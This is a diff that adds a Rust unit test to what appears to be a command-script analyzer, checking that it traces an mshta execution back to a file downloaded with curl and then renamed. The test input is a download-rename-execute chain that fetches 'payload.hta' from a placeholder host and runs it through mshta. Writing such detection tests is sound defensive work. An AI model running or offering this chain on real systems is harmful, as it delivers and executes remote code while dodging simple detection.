@@ -23824,6 +23824,28 @@ mshta renamed.hta"#,
             report.traits
         );
     }
+
+    #[test]
+    fn ren_full_path_source_preserves_directory_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\original.hta https://ren-dir-source.example/payload.hta
+ren C:\Temp\original.hta renamed.hta
+mshta C:\Temp\renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\renamed.hta"
+                            && url == "https://ren-dir-source.example/payload.hta"
+                )
+            }),
+            "renamed full-path source was not linked in the source directory: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
